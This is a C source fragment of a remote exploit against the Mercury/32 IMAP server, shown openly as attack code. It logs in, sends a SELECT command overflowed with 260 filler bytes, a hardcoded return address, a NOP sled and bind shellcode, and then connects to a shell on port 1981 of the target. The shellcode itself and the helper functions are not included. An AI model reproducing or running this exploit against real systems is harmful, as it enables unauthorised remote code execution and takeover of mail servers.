int     SendExploit()
{
    struct hostent *he;
    struct in_addr in;
    struct sockaddr_in peer;
    int             iErr, s,s2;
    int x;
    char    buffer[9000];
    char    buffer2[9000];
    char    szRecvBuff[0x1000];
    char *ip2=NULL;

    printf( "MERCURY32 Imap exploit\n");
    printf( "By: [email protected]\n");
    printf("[+] Entering God Mode\n");

    // Login
    memset(buffer2,0x0,sizeof(buffer2));
    strcat(buffer2,"a001 LOGIN ");
    strcat(buffer2,username);
    strcat(buffer2," ");
    strcat(buffer2,password);
    strcat(buffer2,"\n");

    bzero  (buffer,sizeof(buffer));
    strcat(buffer,"a001 SELECT ");
    x = strlen(buffer);
    memset(buffer+x,0x41,260);
    x+=260;
    *(unsigned int *)&buffer[x] = 0x01f9c8fa;
    x+=4;
    memset(buffer+x,0x90,100);
    x+=100;
    memcpy (buffer+x, sc_bind, strlen(sc_bind));
    x+=strlen(sc_bind);
    memcpy(buffer+x,"\r\n",2);
    x+=2;


    if (!(he = gethostbyname(ip)))
    {
        herror("Resolving host");
        exit(EXIT_FAILURE);
    }
    in.s_addr = *((unsigned int *)he->h_addr);
    peer.sin_family = AF_INET;
    peer.sin_port = htons(iPort);
    peer.sin_addr.s_addr = inet_addr(ip);
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    {
        perror("socket");
        return(0);
    }
    if (connect(s, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0)

    {
        perror("connect");
        return(0);
    }
    printf("[+] connect to %s:%d success.\n", ip, iPort);
    sleep(3);

    memset(szRecvBuff, 0, sizeof(szRecvBuff));
    iErr = send(s, buffer2, strlen(buffer2),0);
    printf("[+] Sent: %d\n", iErr);

    iErr = send(s, buffer, x,0);

    printf("[+] Sent: %d\n", iErr);

    printf("[+] Wait for shell.\n");
    if (!(he = gethostbyname(ip)))
    {
        herror("Resolving host");
        exit(EXIT_FAILURE);
    }
    in.s_addr = *((unsigned int *)he->h_addr);
    ip2 = in.s_addr;

    sleep(5);
    peer.sin_family = AF_INET;
    peer.sin_port = htons(1981);
    peer.sin_addr.s_addr = ip2;
    s2 = socket(AF_INET, SOCK_STREAM, 0);
    if (s2 < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    if (connect(s2, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0)
    {
        perror("connect");
        return(0);
    }
    printf ("[+] We got a shell \n");

    shell(s2);


    return 0;

}